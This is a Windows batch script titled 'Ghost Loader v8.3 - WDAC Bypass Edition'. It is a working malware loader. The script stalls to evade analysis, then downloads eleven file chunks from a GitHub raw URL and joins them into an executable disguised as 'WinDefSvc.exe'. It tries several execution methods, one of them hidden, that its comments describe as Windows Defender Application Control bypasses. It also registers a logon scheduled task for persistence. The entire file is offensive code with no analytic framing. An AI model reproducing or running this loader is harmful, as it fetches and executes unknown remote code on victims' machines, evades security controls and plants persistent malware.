@echo off
setlocal enabledelayedexpansion

:: Ghost Loader v8.3 - WDAC Bypass Edition
:: Uses multiple execution fallbacks

set "repo=https://raw.githubusercontent.com/sophieduval/der/main"
set "dest=%LOCALAPPDATA%\WinDefSvc"
set "exe=WinDefSvc.exe"

:: Anti-analysis delay
ping -n 8 127.0.0.1 >nul 2>&1

:: Create directory
if not exist "%dest%" mkdir "%dest%" 2>nul
cd /d "%dest%"

:: Download chunks
echo Initializing...
for /l %%i in (0,1,10) do (
    set "idx=%%i"
    if %%i LSS 10 set "idx=0%%i"
    set "fn=blob_!idx!.dat"
    if not exist "!fn!" (
        powershell -Command "$wc=New-Object System.Net.WebClient; $wc.DownloadFile('%repo%/!fn!','%dest%\!fn!')" 2>nul
    )
)

:: Verify
if not exist "blob_00.dat" exit /b 1

:: Reassemble
copy /b blob_00.dat+blob_01.dat+blob_02.dat+blob_03.dat+blob_04.dat+blob_05.dat+blob_06.dat+blob_07.dat+blob_08.dat+blob_09.dat+blob_10.dat "%exe%" >nul 2>&1

:: Multi-method execution (WDAC bypass attempts)
:: Method 1: Direct (standard)
start "" "%exe%" 2>nul
if %errorlevel%==0 goto :done

:: Method 2: PowerShell Start-Process
powershell -Command "Start-Process '%dest%\%exe%' -WindowStyle Hidden" 2>nul
if %errorlevel%==0 goto :done

:: Method 3: CMD /C wrapper
cmd /c start "" "%exe%" 2>nul
if %errorlevel%==0 goto :done

:: Method 4: Explorer shell
explorer "%exe%" 2>nul

:done
:: Persistence
powershell -Command "$a=New-ScheduledTaskAction -Execute '%dest%\%exe%';$t=New-ScheduledTaskTrigger -AtLogOn;Register-ScheduledTask -TaskName 'WinDefSvc' -Action $a -Trigger $t -Force" >nul 2>&1

timeout /t 2 >nul
exit
